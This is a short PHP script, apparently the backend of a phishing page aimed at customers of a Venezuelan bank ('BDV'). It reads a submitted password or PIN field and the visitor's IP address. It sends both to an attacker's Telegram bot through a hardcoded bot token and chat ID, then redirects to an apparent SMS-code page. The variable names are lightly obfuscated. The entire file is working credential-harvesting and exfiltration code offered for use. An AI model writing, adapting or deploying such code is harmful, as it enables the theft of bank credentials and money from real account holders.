<?php

// Recoger los datos del formulario
$malta = $_POST['cl'];

// Función para obtener la IP real del usuario, incluso si está detrás de un proxy
function obtener_ip_real() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_lista = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ip_lista[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Obtener la IP real
$direccion_xp = obtener_ip_real();

// API key del chatbot de Telegram
$bxt_axi_kxy = '7787071734:AAGET4_aAQIuSUwwD9q3a-Rm31fArHn6F2Q';

// ID del chat al que se enviará el mensaje
$chxt_id = '-4568985163';

// Mensaje que se enviará al chatbot
$mensxje_para_chaxxot = "BDV-\n" . "Clv: " . $malta .  "\nIP: " . $direccion_xp;

// URL de la API de Telegram para enviar mensajes
$telegram_url = "https://api.telegram.org/bot" . $bxt_axi_kxy . "/sendMessage?chat_id=" . $chxt_id . "&text=" . urlencode($mensxje_para_chaxxot);

// Enviar el mensaje al chatbot de Telegram
$response = file_get_contents($telegram_url);

// Redirigir a index.php
header("Location: misms.html");
exit;

?>